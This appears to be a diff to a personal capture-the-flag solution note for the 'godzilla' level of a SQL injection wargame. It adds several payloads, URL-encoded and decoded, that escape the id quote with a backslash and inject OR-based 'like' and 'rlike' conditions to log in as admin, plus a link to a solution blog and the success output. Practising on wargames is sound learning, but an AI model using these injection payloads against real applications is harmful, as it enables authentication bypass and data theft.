@@ -1,4 +1,8 @@
 brute url: ?id=%5C&pw=%7C%7Cid=0x61646d696e%26%26pw%20like%200x25%23
+           id=\&pw=||pw like 0x25#
+
+another solution: id=\&pw=||pw rlike '^a'#
+https://blog.p6.is/los-solution/#35-godzilla
 
 Hello admin
 GODZILLA Clear!
